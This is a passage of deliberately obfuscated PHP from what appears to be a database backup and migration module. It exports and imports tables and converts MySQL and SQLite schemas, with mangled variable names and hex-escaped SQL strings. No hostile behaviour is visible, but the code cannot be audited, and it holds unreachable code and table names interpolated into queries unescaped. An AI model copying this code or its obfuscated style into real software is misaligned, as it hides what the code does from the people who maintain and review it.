show_json(LNG($²ÆÚ¦æ[1186]) . "\133{$••å¼±Ù}\135", !1); } } } public function sqlFromDb($Ïê“ˆò‹, $ÌÂ¸…¹Ñ, &$«ÓÈÄóÎ, $ÚÚ°¼ğõ = '') { if ($«ÓÈÄóÎ) { $«ÓÈÄóÎ->task[$_SERVER[Ï×Œõ”û][1185]] = $Ïê“ˆò‹; } $×‚ß¬Ïİ = $this->model($Ïê“ˆò‹); $¬ èÜ…Î = 0; $ƒÕëç®¨ = 0; $¡ÁÑÀö° = 10000; $ñò×•ş× = fopen($ÌÂ¸…¹Ñ, $_SERVER[Ï×Œõ”û][1187]); $Ù•§İİà = $×‚ß¬Ïİ->getPk(); $ŒÍÍ³š = $×‚ß¬Ïİ->getDbFields(); $È›¤Üßø = $_SERVER[Ï×Œõ”û][12]; if ($GLOBALS[$_SERVER[Ï×Œõ”û][898]] && in_array($Ïê“ˆò‹, array($_SERVER[Ï×Œõ”û][1188], $_SERVER[Ï×Œõ”û][1189]))) { $È›¤Üßø = $Ïê“ˆò‹; } do { $“¶– î¾ = array($Ù•§İİà => array($_SERVER[Ï×Œõ”û][1135], $ƒÕëç®¨)); $¨‡‹×Ğ = $×‚ß¬Ïİ->where($“¶– î¾)->field($ŒÍÍ³š)->order($Ù•§İİà . $_SERVER[Ï×Œõ”û][1190])->limit($¡ÁÑÀö°)->select(); $¨‡‹×Ğ = !empty($¨‡‹×Ğ) ? $¨‡‹×Ğ : array(); if (!($¼ğ÷‡ÚÊ = count($¨‡‹×Ğ))) { break; } $‹§«³„™ = end($¨‡‹×Ğ); $ƒÕëç®¨ = $‹§«³„™[$Ù•§İİà]; $«ú¾Å¾ = array(); foreach ($¨‡‹×Ğ as $ƒ×ğìÓĞ) { if ($È›¤Üßø) { if ($Ïê“ˆò‹ == $_SERVER[Ï×Œõ”û][1188]) { if ($ƒ×ğìÓĞ[$_SERVER[Ï×Œõ”û][33]] == $_SERVER[Ï×Œõ”û][1191]) { $Å·õ©ª— = json_decode($ƒ×ğìÓĞ[$_SERVER[Ï×Œõ”û][452]], !0); if ($Å·õ©ª—[$_SERVER[Ï×Œõ”û][32]] == $GLOBALS[$_SERVER[Ï×Œõ”û][898]] && $Å·õ©ª—[$_SERVER[Ï×Œõ”û][856]] != 1) { continue; } } } else { if ($ƒ×ğìÓĞ[$_SERVER[Ï×Œõ”û][33]] == $_SERVER[Ï×Œõ”û][1192] && $ƒ×ğìÓĞ[$_SERVER[Ï×Œõ”û][95]] == $_SERVER[Ï×Œõ”û][894]) { continue; } } } if ($ÚÚ°¼ğõ) { $ƒ×ğìÓĞ[$_SERVER[Ï×Œõ”û][87]] = "\173\x69\x6f\72{$ÚÚ°¼ğõ}\x7d" . substr($ƒ×ğìÓĞ[$_SERVER[Ï×Œõ”û][87]], strlen("\x7b\x69\x6f\x3a{$ƒ×ğìÓĞ[$_SERVER[Ï×Œõ”û][932]]}\x7d")); $ƒ×ğìÓĞ[$_SERVER[Ï×Œõ”û][932]] = $ÚÚ°¼ğõ; } $«ú¾Å¾[] = $_SERVER[Ï×Œõ”û][1193] . $this->sqlEncode($ƒ×ğìÓĞ) . $_SERVER[Ï×Œõ”û][1194]; } $Ü…˜Ëë£ = "\x49\116\x53\105\x52\x54\x20\111\116\124\117\x20\x60{$Ïê“ˆò‹}\x60\x20\50\x60" . implode($_SERVER[Ï×Œõ”û][1195], $ŒÍÍ³š) . $_SERVER[Ï×Œõ”û][1196]; fwrite($ñò×•ş×, $Ü…˜Ëë£ . implode($_SERVER[Ï×Œõ”û][1197], $«ú¾Å¾) . $_SERVER[Ï×Œõ”û][74] . PHP_EOL); $¬ èÜ…Î += $¼ğ÷‡ÚÊ; if ($«ÓÈÄóÎ) { $«ÓÈÄóÎ->update($¼ğ÷‡ÚÊ); } } while ($¡ÁÑÀö° == $¼ğ÷‡ÚÊ); fclose($ñò×•ş×); return $¬ èÜ…Î; } public function sqlToDb($íÕ¯Àä, &$ë¿£²šÎ) { $Àõ¸Ã” =& $_SERVER[Ï×Œõ”û]; $ÌÙ‰ßó  = $this->model()->db(); $èåİ…Æñ = @fopen($íÕ¯Àä, $Àõ¸Ã”[1198]); if (!$èåİ…Æñ) { return !1; } $øé¶Æçß = 0; $¹‰Ã„óË = $Àõ¸Ã”[12]; $Ş™·‹› = array(); $¢Ñ¹ŒÎ¼ = $this->dbType(); $ÆøšÂàë = $¢Ñ¹ŒÎ¼ == $Àõ¸Ã”[13] ? 500 : 2000; $šµ•ØÑÉ = basename($íÕ¯Àä, $Àõ¸Ã”[899]); $µ§³„ı = 0; $‡¸èŸ”‚ = 4194304; while (!feof($èåİ…Æñ)) { $çÂıÅ±ş = trim(fgets($èåİ…Æñ)); if (!$çÂıÅ±ş) { continue; } $«ïä÷Ë¡ = $this->sqlDecode($çÂıÅ±ş, $¢Ñ¹ŒÎ¼, $šµ•ØÑÉ); if (stripos($«ïä÷Ë¡, $Àõ¸Ã”[432]) === 0) { if (!$¹‰Ã„óË) { $¹‰Ã„óË = $«ïä÷Ë¡ . $Àõ¸Ã”[53]; } continue; } if ($ë¿£²šÎ) { $ë¿£²šÎ->task[$Àõ¸Ã”[1183]] += 1; } $øé¶Æçß++; $Ş™·‹›[] = rtrim(rtrim(trim($«ïä÷Ë¡), $Àõ¸Ã”[50]), $Àõ¸Ã”[74]); $Œ­‚Ó¸ğ = null; $’÷ÄØæ¾ = strlen($«ïä÷Ë¡); $µ§³„ı += $’÷ÄØæ¾; $¾úÛ˜ƒÓ = strlen($¹‰Ã„óË) + $µ§³„ı + (count($Ş™·‹›) - 1); if ($¾úÛ˜ƒÓ >= $‡¸èŸ”‚) { $Œ­‚Ó¸ğ = array_pop($Ş™·‹›); if ($øé¶Æçß > 1) { $øé¶Æçß--; } } if ($øé¶Æçß >= $ÆøšÂàë || $Œ­‚Ó¸ğ) { $«ïä÷Ë¡ = $¹‰Ã„óË . implode($Àõ¸Ã”[50], $Ş™·‹›); if (!$ÌÙ‰ßó ->execute($«ïä÷Ë¡)) { return !1; } if ($ë¿£²šÎ) { $ë¿£²šÎ->update($øé¶Æçß); } $Ş™·‹› = array(); $øé¶Æçß = 0; $µ§³„ı = 0; if ($Œ­‚Ó¸ğ) { $Ş™·‹› = array($Œ­‚Ó¸ğ); $øé¶Æçß = 1; $µ§³„ı = $’÷ÄØæ¾; } } } fclose($èåİ…Æñ); if (!empty($Ş™·‹›)) { $«ïä÷Ë¡ = $¹‰Ã„óË . implode($Àõ¸Ã”[50], $Ş™·‹›); if (!$ÌÙ‰ßó ->execute($«ïä÷Ë¡)) { return !1; } if ($ë¿£²šÎ) { $ë¿£²šÎ->update($øé¶Æçß); } } return !0; } public function dropTable($şİÌòáü = null) { $™è£™“ =& $_SERVER[Ï×Œõ”û]; $µ²²æ½ = $this->model()->db(); $¬¬åóÎ = $şİÌòáü ? array($şİÌòáü) : $µ²²æ½->getTables(); if (!$¬¬åóÎ) { return; } foreach ($¬¬åóÎ as $şİÌòáü) { if ($şİÌòáü) { $şİÌòáü = strtolower($şİÌòáü); } else { continue; } $µ²²æ½->execute($™è£™“[1199] . $this->escapeName($şİÌòáü) . $™è£™“[1200]); } } private function sqlEncode($«”‹™) { $™Ñ·Õ€ñ =& $_SERVER[Ï×Œõ”û]; $ªş†®¨ = array(); foreach ($«”‹™ as $š¨áêÚ) { if (is_array($š¨áêÚ)) { $š¨áêÚ = json_encode_force($š¨áêÚ); } $š¨áêÚ = addslashes($š¨áêÚ); $š¨áêÚ = str_replace(array($™Ñ·Õ€ñ[1201], $™Ñ·Õ€ñ[287], $™Ñ·Õ€ñ[419]), array($™Ñ·Õ€ñ[1202], $™Ñ·Õ€ñ[1203], $™Ñ·Õ€ñ[1204]), $š¨áêÚ); $ªş†®¨[] = $š¨áêÚ; } return $™Ñ·Õ€ñ[58] . implode($™Ñ·Õ€ñ[1205], $ªş†®¨) . $™Ñ·Õ€ñ[58]; } private function sqlDecode($ºûè­, $€¥Öı‘º, $ù¾ï× = '') { $÷§ú®ô =& $_SERVER[Ï×Œõ”û]; $ºûè­ = str_replace(array($÷§ú®ô[1202], $÷§ú®ô[1203], $÷§ú®ô[1204]), array($÷§ú®ô[1201], $÷§ú®ô[287], $÷§ú®ô[419]), $ºûè­); if ($€¥Öı‘º == $÷§ú®ô[13]) { $ºûè­ = str_ireplace($÷§ú®ô[1206], $÷§ú®ô[59], $ºûè­); $ºûè­ = stripslashes($ºûè­); } return preg_replace($÷§ú®ô[1207], $÷§ú®ô[12], $ºûè­); if ($€¥Öı‘º == $÷§ú®ô[13]) { return $ù¾ï× != $÷§ú®ô[893] ? stripslashes($ºûè­) : $ºûè­; } if ($ù¾ï× == $÷§ú®ô[893]) { $ºûè­ = str_replace($÷§ú®ô[1208], $÷§ú®ô[119], stripslashes($ºûè­)); } return $ºûè­; } public function getSqlFile($•ÌØÙÌ¯ = '') { $¡ÎŸ ÖÇ =& $_SERVER[Ï×Œõ”û]; $³è¸›À = $this->dbType(!0); $Ïí¿ë¹ = CONTROLLER_DIR . "\151\x6e\x73\x74\141\x6c\x6c\x2f\x64\141\164\x61\x2f{$³è¸›À}\x2e\x73\x71\x6c"; if (!file_exists($Ïí¿ë¹)) { return !1; } $ºí»ÄèÃ = file_get_contents($Ïí¿ë¹); $ë°Îîä = $¡ÎŸ ÖÇ[1209] . ($³è¸›À == $¡ÎŸ ÖÇ[910] ? $¡ÎŸ ÖÇ[1210] : $¡ÎŸ ÖÇ[1211]) . $¡ÎŸ ÖÇ[1212]; preg_match_all($ë°Îîä, $ºí»ÄèÃ, $³Ô¬øÀî); $¥¼¡—”“ = $³Ô¬øÀî[1]; $¤‘êãÛŠ = $this->model()->db(); $ŸË–Ü—ß = $¤‘êãÛŠ->getTables(); $çÕÙ°öÔ = TEMP_FILES . $¡ÎŸ ÖÇ[1213] . date($¡ÎŸ ÖÇ[261]) . $¡ÎŸ ÖÇ[8]; del_dir($çÕÙ°öÔ); mk_dir($çÕÙ°öÔ); $ŸùÏÃÍ« = $çÕÙ°öÔ . $¡ÎŸ ÖÇ[1214]; $İÒ« ğ = $çÕÙ°öÔ . $¡ÎŸ ÖÇ[1215]; $‘òÒÔèì = $³è¸›À == $¡ÎŸ ÖÇ[13] ? $¡ÎŸ ÖÇ[910] : $¡ÎŸ ÖÇ[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\163\164\141\x6c\154\x2f\x64\141\164\x61\57{$‘òÒÔèì}\56\x73\161\x6c", $çÕÙ°öÔ); @touch($çÕÙ°öÔ . $³è¸›À . $¡ÎŸ ÖÇ[899]); $ÁŒ„´‹ = fopen($ŸùÏÃÍ«, $¡ÎŸ ÖÇ[1187]); $Ÿ‡Ø‹Ù¸ = fopen($İÒ« ğ, $¡ÎŸ ÖÇ[1187]); if ($³è¸›À == $¡ÎŸ ÖÇ[13]) { $ŸË–Ü—ß = array_diff($ŸË–Ü—ß, array($¡ÎŸ ÖÇ[891], $¡ÎŸ ÖÇ[892])); $õØ©—ü— = array($¡ÎŸ ÖÇ[1216], $¡ÎŸ ÖÇ[1217], $¡ÎŸ ÖÇ[1218]); fwrite($Ÿ‡Ø‹Ù¸, implode(PHP_EOL, $õØ©—ü—) . PHP_EOL . PHP_EOL); foreach ($ŸË–Ü—ß as $Á³ÜĞÙŒ) { $…–é¾Ò = $this->sqlFromSqlite($Á³ÜĞÙŒ); if (!$…–é¾Ò[$¡ÎŸ ÖÇ[13]]) { continue; } fwrite($Ÿ‡Ø‹Ù¸, $…–é¾Ò[$¡ÎŸ ÖÇ[13]] . PHP_EOL . PHP_EOL); if (!in_array($Á³ÜĞÙŒ, $¥¼¡—”“)) { fwrite($ÁŒ„´‹, $…–é¾Ò[$¡ÎŸ ÖÇ[910]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ŸË–Ü—ß as $Á³ÜĞÙŒ) { $…–é¾Ò = $this->sqlFromMysql($Á³ÜĞÙŒ); if (!$…–é¾Ò[$¡ÎŸ ÖÇ[910]]) { continue; } fwrite($ÁŒ„´‹, $…–é¾Ò[$¡ÎŸ ÖÇ[910]] . PHP_EOL . PHP_EOL); if (!in_array($Á³ÜĞÙŒ, $¥¼¡—”“)) { fwrite($Ÿ‡Ø‹Ù¸, $…–é¾Ò[$¡ÎŸ ÖÇ[13]] . PHP_EOL . PHP_EOL); } } } fclose($ÁŒ„´‹); fclose($Ÿ‡Ø‹Ù¸); $ºí»ÄèÃ = array($¡ÎŸ ÖÇ[910] => $ŸùÏÃÍ«, $¡ÎŸ ÖÇ[13] => $İÒ« ğ); return $•ÌØÙÌ¯ ? $ºí»ÄèÃ[$•ÌØÙÌ¯] : $ºí»ÄèÃ; } public function dbType($åÂ¦¼ıâ = false) { $¿´ï¬ =& $_SERVER[Ï×Œõ”û]; $ş„¯¶şˆ = $åÂ¦¼ıâ ? $GLOBALS[$¿´ï¬[6]][$¿´ï¬[21]] : $this->database; $ş„¯¶şˆ = array_change_key_case($ş„¯¶şˆ); $ü¥õ®®ê = $ş„¯¶şˆ[$¿´ï¬[1088]]; if ($ü¥õ®®ê == $¿´ï¬[1085]) { $Ìá¼üŞâ = explode($¿´ï¬[4], $ş„¯¶şˆ[$¿´ï¬[1094]]); $ü¥õ®®ê = $Ìá¼üŞâ[0]; } $¤•Ë¯¬¯ = array($¿´ï¬[1219] => $¿´ï¬[13], $¿´ï¬[1033] => $¿´ï¬[910]); if (isset($¤•Ë¯¬¯[$ü¥õ®®ê])) { $ü¥õ®®ê = $¤•Ë¯¬¯[$ü¥õ®®ê]; } return $ü¥õ®®ê; } public function sqlFromMysql($ì†ßñœµ, $£Åô¯¼ñ = '') { $ÂÌıÛÈƒ =& $_SERVER[Ï×Œõ”û]; $å­Û”ß = array($ÂÌıÛÈƒ[910] => $ÂÌıÛÈƒ[12], $ÂÌıÛÈƒ[13] => $ÂÌıÛÈƒ[12]); $¬˜ğÜçÔ = $this->escapeName($ì†ßñœµ); $Ëßæºê’ = $this->escapeName($ì†ßñœµ, $ÂÌıÛÈƒ[13]); $š†Çì¯ë = $this->model()->db(); $®â”€ˆÉ = $š†Çì¯ë->query("\163\x68\x6f\167\x20\x63\x72\x65\x61\164\x65\x20\164\x61\142\154\145\x20{$¬˜ğÜçÔ}\73"); if (!$®â”€ˆÉ || !$®â”€ˆÉ[0]) { return !1; } $¾ÀìÌÎ© = _get($®â”€ˆÉ[0], $ÂÌıÛÈƒ[1220], $ÂÌıÛÈƒ[12]); if (!$¾ÀìÌÎ©) { return !1; } $£œˆ•°« = "\x44\x52\117\120\40\x54\101\x42\114\x45\x20\x49\x46\x20\x45\x58\x49\x53\124\x53\40{$¬˜ğÜçÔ}\73" . PHP_EOL . $¾ÀìÌÎ© . $ÂÌıÛÈƒ[74]; if ($£Åô¯¼ñ == $ÂÌıÛÈƒ[910]) { return $£œˆ•°«; } $å­Û”ß[$ÂÌıÛÈƒ[910]] = $£œˆ•°«; $ú§Ëê = array_change_key_case($GLOBALS[$ÂÌıÛÈƒ[6]][$ÂÌıÛÈƒ[21]]); $ßŠö¡³ = $ú§Ëê[$ÂÌıÛÈƒ[1093]]; $ü¥®ıüƒ = $ÂÌıÛÈƒ[1221] . $ßŠö¡³ . "\x27\x20\x41\x4e\104\x20\x54\x41\102\x4c\x45\x5f\x4e\x41\x4d\x45\40\x3d\x20{$Ëßæºê’}\x3b"; $ê¤ª¼ÉÁ = "\123\x48\x4f\x57\40\111\116\104\x45\130\x20\106\122\117\x4d\40{$¬˜ğÜçÔ}\73"; $ûïºãò = $š†Çì¯ë->query($ü¥®ıüƒ); if (empty($ûïºãò)) { return $£Åô¯¼ñ ? $å­Û”ß[$£Åô¯¼ñ] : $å­Û”ß; } $²Œ±Ó» = $š†Çì¯ë->query($ê¤ª¼ÉÁ); $Ş»¨åú = $ÂÌıÛÈƒ[12]; $Ÿ› ¨ = array(); foreach ($²Œ±Ó» as $©íı×Ùõ) { if (!$Ş»¨åú && $©íı×Ùõ[$ÂÌıÛÈƒ[1222]] == $ÂÌıÛÈƒ[1223]) { $Ş»¨åú = $©íı×Ùõ[$ÂÌıÛÈƒ[1224]]; } if (isset($Ÿ› ¨[$©íı×Ùõ[$ÂÌıÛÈƒ[1222]]])) { $Ÿ› ¨[$©íı×Ùõ[$ÂÌıÛÈƒ[1222]]][$ÂÌıÛÈƒ[1225]][] = $©íı×Ùõ[$ÂÌıÛÈƒ[1224]]; continue; } $Ÿ› ¨[$©íı×Ùõ[$ÂÌıÛÈƒ[1222]]] = array($ÂÌıÛÈƒ[1226] => $©íı×Ùõ[$ÂÌıÛÈƒ[1222]], $ÂÌıÛÈƒ[1225] => array($©íı×Ùõ[$ÂÌıÛÈƒ[1224]]), $ÂÌıÛÈƒ[1227] => $©íı×Ùõ[$ÂÌıÛÈƒ[1228]] == $ÂÌıÛÈƒ[91] ? 0 : 1); } $ö«Å¶İ¶ = array(); foreach ($Ÿ› ¨ as $©íı×Ùõ) { $’Ö–ô¿ = $©íı×Ùõ[$ÂÌıÛÈƒ[1226]] == $ÂÌıÛÈƒ[1223]; $ÈÒ¤Ø¼“ = $©íı×Ùõ[$ÂÌıÛÈƒ[1227]] == $ÂÌıÛÈƒ[91] && !$’Ö–ô¿ ? $ÂÌıÛÈƒ[1229] : $ÂÌıÛÈƒ[12]; $ë„‚‘ò± = $ÂÌıÛÈƒ[1230] . $ì†ßñœµ . $ÂÌıÛÈƒ[11] . ($’Ö–ô¿ ? $ÂÌıÛÈƒ[1231] : $©íı×Ùõ[$ÂÌıÛÈƒ[1226]]); $ËÌœÓÕŞ = $ÂÌıÛÈƒ[1232] . implode($ÂÌıÛÈƒ[1233], $©íı×Ùõ[$ÂÌıÛÈƒ[1225]]) . $ÂÌıÛÈƒ[1234]; $ö«Å¶İ¶[] = sprintf($ÂÌıÛÈƒ[1235], $ÂÌıÛÈƒ[1236], $ÈÒ¤Ø¼“, $ÂÌıÛÈƒ[1237], $ë„‚‘ò±, $ÂÌıÛÈƒ[1238], $ì†ßñœµ, $ËÌœÓÕŞ); } $˜´¡†­ = array(); $·á¾µ½ö = array($ÂÌıÛÈƒ[1239] => $ÂÌıÛÈƒ[392], $ÂÌıÛÈƒ[1240] => $ÂÌıÛÈƒ[392], $ÂÌıÛÈƒ[366] => $ÂÌıÛÈƒ[392], $ÂÌıÛÈƒ[365] => $ÂÌıÛÈƒ[392], $ÂÌıÛÈƒ[1241] => $ÂÌıÛÈƒ[1242], $ÂÌıÛÈƒ[1243] => $ÂÌıÛÈƒ[1242], $ÂÌıÛÈƒ[1242] => $ÂÌıÛÈƒ[1242], $ÂÌıÛÈƒ[1244] => $ÂÌıÛÈƒ[1242], $ÂÌıÛÈƒ[284] => $ÂÌıÛÈƒ[1242], $ÂÌıÛÈƒ[1245] => $ÂÌıÛÈƒ[1242], $ÂÌıÛÈƒ[1246] => $ÂÌıÛÈƒ[1242], $ÂÌıÛÈƒ[1247] => $ÂÌıÛÈƒ[1248], $ÂÌıÛÈƒ[367] => $ÂÌıÛÈƒ[1248], $ÂÌıÛÈƒ[368] => $ÂÌıÛÈƒ[1248], $ÂÌıÛÈƒ[1249] => $ÂÌıÛÈƒ[1249]); foreach ($ûïºãò as $©íı×Ùõ) { $£Åô¯¼ñ = _get($·á¾µ½ö, $©íı×Ùõ[$ÂÌıÛÈƒ[1250]], $©íı×Ùõ[$ÂÌıÛÈƒ[1251]]); $’Ş¶¹²Ñ = $©íı×Ùõ[$ÂÌıÛÈƒ[1252]] == $ÂÌıÛÈƒ[1016] ? $ÂÌıÛÈƒ[1253] : $ÂÌıÛÈƒ[1254]; $â–Êô¯ç = $©íı×Ùõ[$ÂÌıÛÈƒ[1255]] == $Ş»¨åú ? $ÂÌıÛÈƒ[1256] : $ÂÌıÛÈƒ[12]; $Ï²ıö¸ = $©íı×Ùõ[$ÂÌıÛÈƒ[1070]] ? strtoupper(str_replace($ÂÌıÛÈƒ[11], $ÂÌıÛÈƒ[12], $©íı×Ùõ[$ÂÌıÛÈƒ[1070]])) : $ÂÌıÛÈƒ[12]; $˜´¡†­[] = sprintf($ÂÌıÛÈƒ[1257], $©íı×Ùõ[$ÂÌıÛÈƒ[1255]], $£Åô¯¼ñ, $’Ş¶¹²Ñ, $â–Êô¯ç, $Ï²ıö¸); } $ËóÌÇŠé = array("\104\122\x4f\x50\x20\124\x41\x42\114\x45\40\111\106\x20\105\130\111\123\124\123\40{$Ëßæºê’}\x3b", "\x43\x52\105\x41\124\x45\x20\x54\x41\x42\114\x45\x20{$Ëßæºê’}\40\x28", implode($ÂÌıÛÈƒ[50] . PHP_EOL, $˜´¡†­), $ÂÌıÛÈƒ[1258]); $â„´ˆÄœ = implode(PHP_EOL, array_merge($ËóÌÇŠé, $ö«Å¶İ¶)); if ($£Åô¯¼ñ == $ÂÌıÛÈƒ[13]) { return $â„´ˆÄœ; } $å­Û”ß[$ÂÌıÛÈƒ[13]] = $â„´ˆÄœ; return $å­Û”ß; } public function sqlFromSqlite($¥ã‹¼—, $¯Šæ†Âˆ = '') { $÷ºÌŸÃ =& $_SERVER[Ï×Œõ”û]; $­Ÿ™ãå = array($÷ºÌŸÃ[910] => $÷ºÌŸÃ[12], $÷ºÌŸÃ[13] => $÷ºÌŸÃ[12]); $¨¥­· = $this->escapeName($¥ã‹¼—); $¡Şåşå¼ = $this->escapeName($¥ã‹¼—, $÷ºÌŸÃ[13]); $Ã£ÇÅù‡ = $this->model()->db(); $äÂÅÒİ = "\x50\122\101\107\115\101\40\x54\x41\102\x4c\105\x5f\x49\x4e\x46\x4f\40\x28\47{$¥ã‹¼—}\x27\x29"; $²ŒŸÔ¥Æ = "\123\x45\114\105\x43\x54\x20\x2a\x20\x46\x52\117\115\40\x73\161\154\151\x74\x65\x5f\155\141\x73\164\145\162\40\x57\x48\x45\x52\105\x20\x74\x62\154\x5f\x6e\x61\x6d\145\x20\75\40\x27{$¥ã‹¼—}\x27"; $ºËØ¥ç = $Ã£ÇÅù‡->query($äÂÅÒİ); if (empty($ºËØ¥ç)) { return $¯Šæ†Âˆ ? $­Ÿ™ãå[$¯Šæ†Âˆ] : $­Ÿ™ãå; } $å«Ÿü½Ñ = $Ã£ÇÅù‡->query($²ŒŸÔ¥Æ); $ò€ÃÑËÈ = $ŒúŸ›ò = array(); foreach ($å«Ÿü½Ñ as $·şÆÂ°î) { if ($·şÆÂ°î[$÷ºÌŸÃ[33]] == $÷ºÌŸÃ[359]) { $ò€ÃÑËÈ[] = $·şÆÂ°î[$÷ºÌŸÃ[1259]]; } else { $ŒúŸ›ò[] = $·şÆÂ°î[$÷ºÌŸÃ[1259]]; } } $˜îÍœ²ƒ = array_merge(array("\x44\122\x4f\120\40\x54\x41\102\114\x45\40\111\106\40\105\130\111\123\x54\x53\x20{$¡Şåşå¼}\73"), $ò€ÃÑËÈ, $ŒúŸ›ò); $˜îÍœ²ƒ = implode($÷ºÌŸÃ[74] . PHP_EOL, $˜îÍœ²ƒ) . $÷ºÌŸÃ[74]; if ($¯Šæ†Âˆ == $÷ºÌŸÃ[13]) { return $˜îÍœ²ƒ; } $­Ÿ™ãå[$÷ºÌŸÃ[13]] = $˜îÍœ²ƒ; $Ğ¡ÄÈï = $ÙØ‰ş› = array(); $£í¹¨Ìİ = array(); $Ê•âÓóâ = array(); foreach ($å«Ÿü½Ñ as $·şÆÂ°î) { if ($·şÆÂ°î[$÷ºÌŸÃ[33]] == $÷ºÌŸÃ[1260]) { $Ì„äÀåÏ = $·şÆÂ°î[$÷ºÌŸÃ[1259]]; $™ ¬†é = stripos($Ì„äÀåÏ, $÷ºÌŸÃ[1229]) !== !1; $Ù‹ÀŞğ¶ = stripos($Ì„äÀåÏ, $÷ºÌŸÃ[1223]) !== !1; preg_match($÷ºÌŸÃ[1261], $Ì„äÀåÏ, $õÛ³Ì–”); if (empty($õÛ³Ì–”)) { continue; } $‘ûÁ’ş³ = array_map($÷ºÌŸÃ[1262], explode($÷ºÌŸÃ[50], $õÛ³Ì–”[1])); $¨÷äÂ¶‡ = array(); foreach ($‘ûÁ’ş³ as $ÀÚ‡Ø²€) { $Í˜ß³Õû = trim($ÀÚ‡Ø²€, $÷ºÌŸÃ[1263]); $¨÷äÂ¶‡[] = $Í˜ß³Õû; $£í¹¨Ìİ[$Í˜ß³Õû] = !0; } $Ê•âÓóâ[] = array($÷ºÌŸÃ[32] => $·şÆÂ°î[$÷ºÌŸÃ[32]], $÷ºÌŸÃ[1259] => $Ì„äÀåÏ, $÷ºÌŸÃ[1264] => $™ ¬†é, $÷ºÌŸÃ[1265] => $Ù‹ÀŞğ¶, $÷ºÌŸÃ[1266] => $¨÷äÂ¶‡); } } $ğÈèçÍÚ = array($÷ºÌŸÃ[1240] => $÷ºÌŸÃ[1240], $÷ºÌŸÃ[392] => $÷ºÌŸÃ[1267], $÷ºÌŸÃ[1248] => $÷ºÌŸÃ[1268], $÷ºÌŸÃ[1242] => $÷ºÌŸÃ[1242], $÷ºÌŸÃ[1249] => $÷ºÌŸÃ[1269], $÷ºÌŸÃ[1270] => $÷ºÌŸÃ[1271]); $ë»¤¾„ = array($÷ºÌŸÃ[452], $÷ºÌŸÃ[170], $÷ºÌŸÃ[545]); $¸Òìó = array($÷ºÌŸÃ[392], $÷ºÌŸÃ[1248], $÷ºÌŸÃ[1270], $÷ºÌŸÃ[1240]); foreach ($ºËØ¥ç as $·şÆÂ°î) { $« áü‰ß = $·şÆÂ°î[$÷ºÌŸÃ[32]]; $à†Â¢€ = strtolower($·şÆÂ°î[$÷ºÌŸÃ[33]]); if ($à†Â¢€ == $÷ºÌŸÃ[1242] && isset($£í¹¨Ìİ[$« áü‰ß])) { $¯Šæ†Âˆ = in_array($« áü‰ß, $ë»¤¾„) ? $÷ºÌŸÃ[1242] : $÷ºÌŸÃ[1272]; } else { $¯Šæ†Âˆ = _get($ğÈèçÍÚ, $à†Â¢€, $à†Â¢€); } if ($·şÆÂ°î[$÷ºÌŸÃ[57]] > 0) { $ÙØ‰ş›[$·şÆÂ°î[$÷ºÌŸÃ[57]]] = $« áü‰ß; } $™ÔìÀ’ = $÷ºÌŸÃ[12]; if ($·şÆÂ°î[$÷ºÌŸÃ[56]] !== null) { $ò§ò «æ = $·şÆÂ°î[$÷ºÌŸÃ[56]]; if (in_array($à†Â¢€, $¸Òìó) && is_numeric($ò§ò «æ)) { $™ÔìÀ’ = "\104\x45\x46\101\x55\114\124\40{$ò§ò «æ}"; } else { if (strtolower($ò§ò «æ) === $÷ºÌŸÃ[104]) { $™ÔìÀ’ = $·şÆÂ°î[$÷ºÌŸÃ[35]] ? $÷ºÌŸÃ[12] : $÷ºÌŸÃ[1254]; } else { $·›œêÛâ = is_numeric($ò§ò «æ) ? $ò§ò «æ : $÷ºÌŸÃ[58] . addslashes($ò§ò «æ) . $÷ºÌŸÃ[58]; $™ÔìÀ’ = "\x44\105\x46\x41\x55\x4c\124\x20{$·›œêÛâ}"; } } } $Ãîø÷ß® = $·şÆÂ°î[$÷ºÌŸÃ[35]] ? $÷ºÌŸÃ[1253] : $÷ºÌŸÃ[1273]; $úŸé –¬ = stripos($à†Â¢€, $÷ºÌŸÃ[366]) !== !1 && $·şÆÂ°î[$÷ºÌŸÃ[57]] ? $÷ºÌŸÃ[1274] : $÷ºÌŸÃ[12]; $Ğ¡ÄÈï[] = sprintf($÷ºÌŸÃ[1275], $« áü‰ß, $¯Šæ†Âˆ, $Ãîø÷ß®, $™ÔìÀ’, $úŸé –¬); } if (!empty($ÙØ‰ş›)) { ksort($ÙØ‰ş›); $ô™ú¯Ç = $÷ºÌŸÃ[473] . implode($÷ºÌŸÃ[1195], $ÙØ‰ş›) . $÷ºÌŸÃ[473]; $Ğ¡ÄÈï[] = "\120\x52\x49\115\101\122\x59\x20\113\105\x59\40\50{$ô™ú¯Ç}\51"; } foreach ($Ê•âÓóâ as $í«Ê“ò™) { if ($í«Ê“ò™[$÷ºÌŸÃ[1265]]) { continue; } $ÇÜÓÌ¡— = array(); foreach ($í«Ê“ò™[$÷ºÌŸÃ[1266]] as $ÀÚ‡Ø²€) { $ğÈèçÍÚ = null; foreach ($ºËØ¥ç as $©«ºß«») { if ($©«ºß«»[$÷ºÌŸÃ[32]] == $ÀÚ‡Ø²€) { $ğÈèçÍÚ = strtolower($©«ºß«»[$÷ºÌŸÃ[33]]); break; } } if ($ğÈèçÍÚ == $÷ºÌŸÃ[1242] && in_array($ÀÚ‡Ø²€, $ë»¤¾„)) { $ÇÜÓÌ¡—[] = "\140{$ÀÚ‡Ø²€}\x60\x28\x32\x35\x30\51"; } else { $ÇÜÓÌ¡—[] = "\140{$ÀÚ‡Ø²€}\x60"; } } $à†Â¢€ = ($í«Ê“ò™[$÷ºÌŸÃ[1264]] ? $÷ºÌŸÃ[1276] : $÷ºÌŸÃ[12]) . $÷ºÌŸÃ[1277]; $¨ß›ë¡â = str_replace($÷ºÌŸÃ[1230] . $¥ã‹¼— . $÷ºÌŸÃ[11], $÷ºÌŸÃ[12], $í«Ê“ò™[$÷ºÌŸÃ[32]]); $¨ß›ë¡â = str_replace($¥ã‹¼— . $÷ºÌŸÃ[11], $÷ºÌŸÃ[12], $¨ß›ë¡â); $Ğ¡ÄÈï[] = "{$à†Â¢€}\40\x60{$¨ß›ë¡â}\x60\x20\50" . implode($÷ºÌŸÃ[50], $ÇÜÓÌ¡—) . $÷ºÌŸÃ[1194]; } $ù¶±’×¶ = array("\x44\122\x4f\x50\x20\x54\101\102\114\x45\x20\x49\x46\40\x45\x58\x49\123\124\x53\x20{$¨¥­·}\73", "\103\x52\x45\x41\x54\x45\x20\124\x41\102\x4c\x45\40{$¨¥­·}\x20\x28", implode($÷ºÌŸÃ[50] . PHP_EOL, 